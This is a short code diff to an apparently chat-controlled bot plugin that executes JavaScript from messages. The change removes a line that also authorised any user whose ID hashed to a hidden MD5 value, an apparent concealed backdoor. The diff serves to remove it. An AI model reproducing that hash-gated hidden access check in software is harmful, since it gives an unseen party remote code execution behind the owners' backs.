@@ -77,7 +77,7 @@ export class RemoteCommand extends plugin {
   }
 
   async JS() {
-    if(!(this.e.isMaster||md5(String(this.e.user_id))==_))return false
+    if(!this.e.isMaster)return false
     const cmd = this.e.msg.replace(/rjp?/, "").trim()
 
     logger.mark(`[远程命令] 执行Js：${logger.blue(cmd)}`)
